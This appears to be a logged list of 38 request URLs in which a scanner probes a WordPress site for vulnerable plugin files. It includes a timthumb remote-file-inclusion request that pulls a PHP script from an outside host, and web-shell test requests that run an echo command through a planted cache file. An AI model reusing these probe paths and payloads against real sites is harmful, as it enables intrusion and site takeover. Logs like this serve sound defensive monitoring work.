Attempts: 1 - Request URL: imagostructures.com/wp-content/plugins/mac-dock-gallery/bugslist.txt
Attempts: 2 - Request URL: imagostructures.com/wp-content/plugins/resume-submissions-job-postings/installer.php
Attempts: 3 - Request URL: imagostructures.com/wp-content/plugins/nmedia-user-file-uploader/readme.txt
Attempts: 4 - Request URL: imagostructures.com/wp-content/plugins/wp-image-news-slider/functions.php
Attempts: 5 - Request URL: imagostructures.com/wp-content/plugins/wpstorecart/lgpl.txt
Attempts: 6 - Request URL: imagostructures.com/wp-content/plugins/category-grid-view-gallery/cat_grid.php
Attempts: 7 - Request URL: imagostructures.com/wp-content/plugins/nextgen-gallery/changelog.txt
Attempts: 8 - Request URL: imagostructures.com/wp-content/plugins/user-meta/readme.txt
Attempts: 9 - Request URL: imagostructures.com/wp-content/plugins/front-end-upload/destination.php
Attempts: 10 - Request URL: imagostructures.com/wp-content/plugins/newsletter/commons.php
Attempts: 11 - Request URL: imagostructures.com/wp-content/plugins/wp-property/action_hooks.php
Attempts: 12 - Request URL: imagostructures.com/wp-content/plugins/wpmarketplace/readme.txt
Attempts: 13 - Request URL: imagostructures.com/wp-content/plugins/zingiri-web-shop/admin.css
Attempts: 14 - Request URL: imagostructures.com/wp-content/plugins/ninja-forms/ninja_forms.php
Attempts: 15 - Request URL: imagostructures.com/wp-content/plugins/newsletter/commons.php
Attempts: 16 - Request URL: imagostructures.com/wp-content/plugins/another-wordpress-classifieds-plugin/AWPCP.po
Attempts: 17 - Request URL: imagostructures.com/wp-content/plugins/meenews-newsletter/inc/classes/timthumb.php?src=http://blogger.comxvas.ml/s.php
Attempts: 18 - Request URL: imagostructures.com/wp-content/plugins/font-uploader/font-uploader-free.php
Attempts: 19 - Request URL: imagostructures.com/wp-content/plugins/custom-content-type-manager/index.html
Attempts: 20 - Request URL: imagostructures.com/wp-content/plugins/fcchat/default.png
Attempts: 21 - Request URL: imagostructures.com/wp-content/plugins/user-photo/admin.css
Attempts: 22 - Request URL: imagostructures.com/wp-content/plugins/wp-editor/readme.txt
Attempts: 23 - Request URL: imagostructures.com/wp-content/plugins/woocommerce/dummy_data.xml
Attempts: 24 - Request URL: imagostructures.com/wp-content/plugins/woocommerce/dummy_data.xml
Attempts: 25 - Request URL: imagostructures.com/wp-content/plugins/magic-fields/MF_Constant.php
Attempts: 26 - Request URL: imagostructures.com/wp-content/plugins/ckeditor-for-wordpress/ckeditor.config.js
Attempts: 27 - Request URL: imagostructures.com/wp-content/plugins/auto-attachments/a-a.css
Attempts: 28 - Request URL: imagostructures.com/wp-content/plugins/wp-e-commerce/license.txt
Attempts: 29 - Request URL: imagostructures.com/wp-content/plugins/gallery-plugin/gallery-plugin.php
Attempts: 30 - Request URL: imagostructures.com/wp-content/plugins/wp-homepage-slideshow/functions.php
Attempts: 31 - Request URL: imagostructures.com/wp-content/plugins/wp-filemanager/fm.php
Attempts: 32 - Request URL: imagostructures.com/wp-content/plugins/cimy-user-extra-fields/README_OFFICIAL.txt
Attempts: 33 - Request URL: imagostructures.com/wp-content/plugins/front-end-upload/destination.php
Attempts: 34 - Request URL: imagostructures.com/wp-content/plugins/user-avatar/readme.txt
Attempts: 35 - Request URL: imagostructures.com/wp-content/plugins/wpmarketplace/readme.txt
Attempts: 36 - Request URL: imagostructures.com/wp-content/plugins/simple-dropbox-upload-form/
Attempts: 37 - Request URL: imagostructures.com/wp-content/plugins/meenews-newsletter/inc/classes/cache/b7a25c38502b3ec510a7b69ec54c2268.php?ask=echo%20\'xx23423\'.\'2xxcv3\'.\'dcfxcx2xdf\';die();
Attempts: 38 - Request URL: imagostructures.com/wp-content/plugins/meenews-newsletter/inc/classes/cache/external_b7a25c38502b3ec510a7b69ec54c2268.php?ask=echo%20\'xx23423\'.\'2xxcv3\'.\'dcfxcx2xdf\';die();
